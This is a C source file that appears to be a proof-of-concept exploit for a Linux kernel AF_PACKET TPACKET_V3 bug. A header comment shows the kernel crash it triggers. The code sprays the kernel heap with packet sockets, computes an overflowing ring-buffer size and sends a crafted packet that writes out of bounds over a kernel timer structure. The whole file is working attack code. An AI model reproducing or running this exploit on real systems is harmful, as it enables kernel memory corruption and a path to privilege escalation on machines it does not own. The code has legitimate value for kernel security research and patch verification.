/*
Should generate the following crash dump
[   21.485766] general protection fault: 0000 [#1] SMP
[   21.486959] Modules linked in:
[   21.487442] CPU: 0 PID: 1710 Comm: alloc Not tainted 4.10.6 #2
[   21.488330] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014
[   21.489708] task: ffff88007cbfde00 task.stack: ffffc900019e8000
[   21.490636] RIP: 0010:detach_if_pending+0x3a/0xd0
[   21.491372] RSP: 0018:ffffc900019ebc68 EFLAGS: 00010106
[   21.492164] RAX: 4242424242424242 RBX: ffff880075088b80 RCX: ffff88007fc0f3a0
[   21.493227] RDX: ffff88007fc0f3a0 RSI: ffff88007fc0ed40 RDI: ffff880075088b80
[   21.494290] RBP: ffffc900019ebc80 R08: 0000000000000000 R09: 0000000000000000
[   21.495247] R10: ffff880079e0ea30 R11: ffff88007a4f1210 R12: ffff88007fc0ed40
[   21.496109] R13: 0000000000000001 R14: 0000000000000000 R15: 0000000000000001
[   21.496975] FS:  00007f78e6dac700(0000) GS:ffff88007fc00000(0000) knlGS:0000000000000000
[   21.497953] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   21.498650] CR2: 00007f78e68ab1b0 CR3: 0000000001e0a000 CR4: 00000000000006f0
[   21.499535] Call Trace:
[   21.499847]  try_to_del_timer_sync+0x38/0x60
[   21.500373]  del_timer_sync+0x43/0x50
[   21.500824]  packet_set_ring+0x26b/0x740
[   21.501309]  ? destroy_inode+0x36/0x50
[   21.501770]  ? evict+0x124/0x180
[   21.502171]  ? __dev_remove_pack+0x2f/0xc0
[   21.502734]  packet_release+0x177/0x370
[   21.503225]  sock_release+0x1a/0x80
[   21.503649]  sock_close+0xd/0x20
[   21.504037]  __fput+0xda/0x1e0
[   21.504406]  ____fput+0x9/0x10
[   21.504777]  task_work_run+0x71/0x90
[   21.505221]  do_exit+0x2b8/0xb30
[   21.505727]  ? __hrtimer_init+0x90/0x90
[   21.506310]  ? do_nanosleep+0x56/0xf0
[   21.506882]  do_group_exit+0x42/0xb0
[   21.507438]  SyS_exit_group+0xf/0x10
[   21.507995]  entry_SYSCALL_64_fastpath+0x1a/0xa9
[   21.508708] RIP: 0033:0x7f78e68ab618
[   21.509262] RSP: 002b:00007ffe4830c608 EFLAGS: 00000246 ORIG_RAX: 00000000000000e7
[   21.510417] RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 00007f78e68ab618
[   21.511489] RDX: 0000000000000000 RSI: 000000000000003c RDI: 0000000000000000
[   21.512542] RBP: 00007ffe4830c630 R08: 00000000000000e7 R09: ffffffffffffff98
[   21.513594] R10: 00007ffe4830c588 R11: 0000000000000246 R12: 000055b1dbf34860
[   21.514647] R13: 00007ffe4830c720 R14: 0000000000000000 R15: 0000000000000000
*/


#define _GNU_SOURCE

#include <errno.h>
#include <fcntl.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sched.h>

#include <sys/ioctl.h>
#include <sys/klog.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>

#include <arpa/inet.h>
#include <linux/if_packet.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <netinet/if_ether.h>
#include <net/if.h>

#define KMALLOC_PAD	512
#define PAGEALLOC_PAD	1024

#define TIMER_OFFSET	896
#define XMIT_OFFSET	1304

#define ALIGN(x, a)			__ALIGN_KERNEL((x), (a))
#define __ALIGN_KERNEL(x, a)		__ALIGN_KERNEL_MASK(x, (typeof(x))(a) - 1)
#define __ALIGN_KERNEL_MASK(x, mask)	(((x) + (mask)) & ~(mask))

#define V3_ALIGNMENT	(8)
#define BLK_HDR_LEN	(ALIGN(sizeof(struct tpacket_block_desc), V3_ALIGNMENT))

#define ETH_HDR_LEN	sizeof(struct ethhdr)
#define IP_HDR_LEN	sizeof(struct iphdr)
#define UDP_HDR_LEN	sizeof(struct udphdr)


void packet_socket_rx_ring_init(int s, unsigned int block_size,
		unsigned int frame_size, unsigned int block_nr,
		unsigned int sizeof_priv, unsigned int timeout)
{
	int v = TPACKET_V3;
	int rv = setsockopt(s, SOL_PACKET, PACKET_VERSION, &v, sizeof(v));
	if (rv < 0) {
		perror("[-] setsockopt(PACKET_VERSION)");
		exit(EXIT_FAILURE);
	}

	struct tpacket_req3 req;
	memset(&req, 0, sizeof(req));
	req.tp_block_size = block_size;
	req.tp_frame_size = frame_size;
	req.tp_block_nr = block_nr;
	req.tp_frame_nr = (block_size * block_nr) / frame_size;
	req.tp_retire_blk_tov = timeout;
	req.tp_sizeof_priv = sizeof_priv;
	req.tp_feature_req_word = 0;

	rv = setsockopt(s, SOL_PACKET, PACKET_RX_RING, &req, sizeof(req));
	if (rv < 0) {
		perror("[-] setsockopt(PACKET_RX_RING)");
		exit(EXIT_FAILURE);
	}
}


int packet_socket_setup(unsigned int block_size, unsigned int frame_size,
		unsigned int block_nr, unsigned int sizeof_priv, int timeout) {
	int s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
	if (s < 0) {
		perror("[-] socket(AF_PACKET)");
		exit(EXIT_FAILURE);
	}

	packet_socket_rx_ring_init(s, block_size, frame_size, block_nr,
		sizeof_priv, timeout);

	struct sockaddr_ll sa;
	memset(&sa, 0, sizeof(sa));
	sa.sll_family = PF_PACKET;
	sa.sll_protocol = htons(ETH_P_ALL);
	sa.sll_ifindex = if_nametoindex("lo");
	sa.sll_hatype = 0;
	sa.sll_pkttype = 0;
	sa.sll_halen = 0;

	int rv = bind(s, (struct sockaddr *)&sa, sizeof(sa));
	if (rv < 0) {
		perror("[-] bind(AF_PACKET)");
		exit(EXIT_FAILURE);
	}
	return s;
}

int packet_sock_kmalloc() {
	int s = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP));
	if (s == -1) {
		perror("[-] socket(SOCK_DGRAM)");
		exit(EXIT_FAILURE);
	}
	printf("%d\n", s);
	return s;
}


void kmalloc_pad(int count) {
	int i;
	for (i = 0; i < count; i++)
		packet_sock_kmalloc();
	
}

void pagealloc_pad(int count) {
	packet_socket_setup(0x8000, 2048, count, 0, 100);
}

int oob_setup(int offset) {
	unsigned int maclen = ETH_HDR_LEN;
	unsigned int netoff = TPACKET_ALIGN(TPACKET3_HDRLEN +
				(maclen < 16 ? 16 : maclen));
	unsigned int macoff = netoff - maclen;
	unsigned int sizeof_priv = (1u<<31) + (1u<<30) +
		0x8000 - BLK_HDR_LEN - macoff + offset;
	return packet_socket_setup(0x8000, 2048, 2, sizeof_priv, 100);
}

void packet_sock_timer_schedule(int s, int timeout) {
	packet_socket_rx_ring_init(s, 0x1000, 0x1000, 1, 0, timeout);
}

void packet_socket_send(int s, char *buffer, int size) {
	struct sockaddr_ll sa;
	memset(&sa, 0, sizeof(sa));
	sa.sll_ifindex = if_nametoindex("lo");
	sa.sll_halen = ETH_ALEN;

	if (sendto(s, buffer, size, 0, (struct sockaddr *)&sa,
			sizeof(sa)) < 0) {
		perror("[-] sendto(SOCK_RAW)");
		exit(EXIT_FAILURE);
	}
}

int oob_write()
{
	char buffer[2048];
	memset(&buffer[0], 0x42, sizeof(buffer));
	int s = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);
	if (s == -1) {
		perror("[-] socket(SOCK_RAW)");
		exit(EXIT_FAILURE);
	}
	packet_socket_send(s, &buffer[0]+2, 18);
	return 0;
}

void oob_timer_execute() 
{
	oob_setup(2048 + TIMER_OFFSET - 8);
	int i;
	for (i = 0; i < 32; i++) {
		int timer = packet_sock_kmalloc();
		packet_sock_timer_schedule(timer, 1000);
	}

	oob_write();
	sleep(1);
}

int main()
{
	kmalloc_pad(KMALLOC_PAD);
	pagealloc_pad(PAGEALLOC_PAD);
	oob_timer_execute(); 
	return 0;
}
